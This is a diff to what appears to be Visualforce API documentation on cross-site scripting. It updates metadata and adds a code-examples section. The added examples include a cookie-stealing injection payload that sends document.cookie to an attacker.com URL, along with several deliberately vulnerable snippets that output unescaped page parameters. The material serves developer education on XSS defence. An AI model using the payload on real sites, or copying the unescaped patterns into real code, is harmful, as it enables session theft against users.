@@ -5,11 +5,17 @@ topic: cross-site-scripting-xss
 apiVersion: 67.0
 release: summer-26-v67
 docType: api-reference
-lastCollected: 2026-03-11T15:43:48.210Z
-keywords: [Cross, Site, Scripting, XSS, Existing, Protection, Disabling, Escape, Visualforce, Tags, Programming, Items, Protected]
+lastCollected: 2026-03-12T05:14:34.909Z
+estimatedTokens: 1144
+keywords: [Cross, Site, Scripting, XSS, Cross-site, scripting, attacks, where, malicious, HTML, client-side, provided, web, application., application, includes, response, user, who, unknowingly]
 ---
 
 # Cross Site Scripting (XSS)
+
+> Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is
+        provided to a web application. The web application includes malicious scripting in a
+        response to a user who unknowingly becomes the victim of the attack. The attacker uses the
+        web applicat
 
 # Cross Site Scripting (XSS)
 
@@ -70,4 +76,31 @@ With the <apex:includeScript\> Visualforce component, you can include a custom s
 
 ```
 
+```
+
+## Code Examples
+
+```
+<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>
+```
+
+```
+1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2
+```
+
+```
+<apex:outputText> 
+    {!$CurrentPage.parameters.userInput} 
+</apex:outputText>
+```
+
+```
+<apex:outputText escape="false" value="{!$CurrentPage.parameters.userInput}" />
+```
+
+```
+<script> 
+    var foo = location.search; 
+    document.write(foo); 
+</script>
 ```
